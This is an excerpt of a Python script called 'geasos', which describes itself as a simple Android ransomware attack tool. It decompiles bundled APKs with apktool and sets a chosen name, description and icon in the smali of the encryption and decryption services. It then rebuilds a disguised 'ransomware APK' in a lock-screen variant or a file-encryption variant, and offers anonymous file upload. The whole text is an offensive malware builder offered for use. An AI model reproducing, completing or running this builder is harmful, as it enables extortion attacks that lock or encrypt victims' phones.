...
# variables
imgv1 = ["geasos/res/drawable-hdpi-v4/ic_launcher.png","geasos/res/drawable-mdpi-v4/ic_launcher.png","geasos/res/drawable-xhdpi-v4/ic_launcher.png","geasos/res/drawable-xxhdpi-v4/ic_launcher.png"]
imgv2 = ["geasos/res/mipmap-hdpi/ic_launcher.png","geasos/res/mipmap-mdpi/ic_launcher.png","geasos/res/mipmap-xhdpi/ic_launcher.png","geasos/res/mipmap-xxhdpi/ic_launcher.png","geasos/res/mipmap-xxxhdpi/ic_launcher.png"]
# banner
...
# geasos - Simple Android Ransomware Attack (version 2.0)
class geasos:
    def __init__(self):
        self.AppIcon=""
        self.AppName=""
        ...
        while True:
            if os.path.isfile(file):
                ...
                for line in fileinput.input(file, inplace=True):
                    ...
                    print(line, end="")
                break
            else: os.system("rm -rf geasos > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} failed to write on file: {file}")
    def buildapk(self):
        try:
            os.system("apktool b --use-aapt2 geasos -o final.apk")
            if os.path.isfile("final.apk"):
                os.system("rm -rf geasos > /dev/null 2>&1")
...
{w}[{b}2{w}] anonfiles.com - anonymous file upload
            ...
            else: os.system("rm -rf geasos > /dev/null 2>&1"); exit(f"{w}{R} ERROR {w} failed to build APK's")
    ...
    def builder(self,version):
        ...
        if version == 1:
            ...
            print(w+"-"*43+d)
            os.system("apktool d data/v1/geasos.apk")
            if os.path.isdir("geasos"):
                strings="geasos/res/values/strings.xml"
                print("I: Using strings: "+strings)
                smali=os.popen(f"find -L geasos/ -name '*0000.smali'","r").readline().strip()
                ...
                for path in imgv1:
                    ...
                    else: os.system("rm -rf geasos > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} directory not found: {path}")
                self.buildapk()
            else: os.system("rm -rf geasos > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} failed to decompile APK's")
        elif version == 2:
            while True:
                x=str(input(f"{b}>{w} SET APP_ICON ({r}PNG: icon.png{w}): "+g))
                if os.path.isfile(x):
            ...
            print(f"{b}>{w} Building your ransomware APK's")
            print(w+"-"*43+d)
            os.system("apktool d data/v2/geasos.apk")
            if os.path.isdir("geasos"):
                strings="geasos/res/values/strings.xml"
                print("I: Using strings: "+strings)
                self.write(strings,"AppName",self.AppName)
                self.write("geasos/smali/com/termuxhackersid/services/EncryptionService.smali","AppName",self.AppName)
                self.write("geasos/smali/com/termuxhackersid/services/DecryptionService.smali","AppName",self.AppName)
                print("I: Adding name with "+self.AppName)
                self.write("geasos/smali/com/termuxhackersid/services/EncryptionService.smali","AppDesc",self.AppDesc)
                self.write("geasos/smali/com/termuxhackersid/ui/MainActivity$a.smali","AppDesc",self.AppDesc)
                self.write("geasos/smali/com/termuxhackersid/ui/MainActivity.smali","AppDesc",self.AppDesc)
                print("I: Adding description with "+str(len(self.AppDesc))+" words")
                time.sleep(3)
                print("I: Adding icon with "+self.AppIcon)
                for path in imgv2:
    ...
    def menu(self):
        ...
        banner()
        print(f"""
{w}{R} geasos {w} SIMPLE ANDROID RANSOMWARE ATTACK
...
{w}[{b}1{w}] geasos - version 1.0 ({y}TYPE LOCK SCREEN{w})
{w}[{b}2{w}] geasos - version 2.0 ({y}TYPE FILE ENCRYPTION{w})
